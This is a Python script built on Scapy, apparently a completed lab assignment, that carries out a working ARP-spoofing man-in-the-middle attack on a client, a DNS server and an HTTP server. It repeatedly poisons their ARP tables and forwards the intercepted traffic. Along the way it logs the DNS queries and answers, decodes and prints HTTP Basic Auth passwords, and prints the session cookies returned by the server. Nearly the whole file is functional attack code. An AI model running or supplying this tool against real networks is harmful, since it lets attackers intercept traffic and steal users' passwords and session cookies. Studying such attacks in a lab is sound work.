from scapy.all import *

import argparse
import sys
import threading
import time
# SOURCES:
###############################################################################
# https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html
# 
###############################################################################
def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
   try:
       yes,no = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP))
       for r in yes:
           x,y = r
           return y[Ether].src
   except:
       debug("Error resolving MAC address for {}".format(IP))
       return ""


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC,httpServerIP,httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(httpServerIP,attackerMAC,clientIP,clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP,attackerMAC,dnsServerIP,dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    spoofed = Ether(src=srcMAC,dst=dstMAC)/makeARP(dstIP,srcIP,srcMAC,dstMAC)
    sendp(spoofed.build())
# helper func
def makeARP(dst,src,hw_src,gw="ff:ff:ff:ff:ff:ff"):
    return ARP(op=2,pdst=dst,psrc=src,hwdst=gw,hwsrc=hw_src)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(makeARP(dstIP,srcIP,srcMAC,dstMAC))
# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
from scapy.layers.http import *
from base64 import b64decode
def forward(packet):
    global clientMAC, clientIP, httpServerMAC, \
      httpServerIP, dnsServerIP, dnsServerMAC, \
        attackerIP, attackerMAC
    # Change the layer 2 routing information of the packet
    if packet.haslayer(Ether) \
      and packet[Ether].src.__eq__(attackerMAC):
        pass
    # Packet forwarded to dnsServer
    elif packet.haslayer(IP) and packet[IP].dst.__eq__(dnsServerIP):
        packet[Ether].dst = dnsServerMAC
        packet[Ether].src = attackerMAC
        sendp(Ether(packet.build()))         
    # Packet forwarded to client
    elif packet.haslayer(IP) and packet[IP].dst.__eq__(clientIP):
        packet[Ether].dst = clientMAC
        packet[Ether].src = attackerMAC
        sendp(Ether(packet.build()))
    # Packet forwarded to httpServer
    elif packet.haslayer(IP) and packet[IP].dst.__eq__(httpServerIP):
        packet[Ether].dst = httpServerMAC
        packet[Ether].src = attackerMAC
        sendp(Ether(packet.build()))

def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    try:
        # DNS Query: client --> dnsServer
        if packet.haslayer(DNS) and packet.haslayer(UDP)\
          and packet[UDP].dport == 53: 
            hostname = packet[DNS].qd.qname.decode()
            print('*hostname:{}'.format(hostname))
        # DNS Query Response: dnsServer --> client
        elif packet.haslayer(DNS) and packet.haslayer(UDP)\
          and packet[UDP].sport == 53:
            if packet.haslayer(DNSRR):
                resolved_ip = packet[DNSRR].rdata
                print('*hostaddr:{}'.format(resolved_ip))
        # TCP/HTTP Packet: client --> httpServer
        if packet.haslayer(TCP) and packet.haslayer(HTTPRequest) \
          and packet[IP].src == clientIP \
            and packet[TCP].dport == 80:
                try:
                    auth = packet[HTTPRequest].Authorization
                    auth = auth[auth.index(b' ')+1:]
                    passwd = b64decode(auth).decode()
                    passwd = passwd[passwd.index(':')+1:]
                    print('*basicauth:{}'.format(passwd))
                except:
                    pass
        # TCP/HTTP Packet: httpServer --> client
        elif packet.haslayer(TCP) and packet.haslayer(HTTPResponse) \
          and packet[IP].src == httpServerIP \
            and packet[TCP].sport == 80:
                try:
                    cookie = packet[HTTP].Set_Cookie.decode()
                    print('*cookie:{}'.format(cookie[:]))
                except:
                    pass
        # Forwarding
        forward(packet)
    except:
        debug('Error: packet: {}'.format(packet))
        pass
if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()
    
    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
